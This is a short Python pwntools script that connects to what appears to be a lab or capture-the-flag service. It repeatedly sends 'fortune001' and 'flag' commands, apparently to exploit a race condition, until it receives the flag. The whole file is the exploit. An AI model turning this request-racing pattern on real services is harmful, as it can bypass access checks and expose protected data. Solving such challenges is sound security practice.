from pwn import *
import time

io = remote('up.zoolab.org', 10931)
io.recvuntil(b'Commands:')

while True:
    io.sendline(b'fortune001')
    io.sendline(b'flag')
    try:
        res = io.recvline(timeout=0.5)
        if b'F> ' and b'FLAG' in res:
            print(res.decode())
            break
    except:
        pass
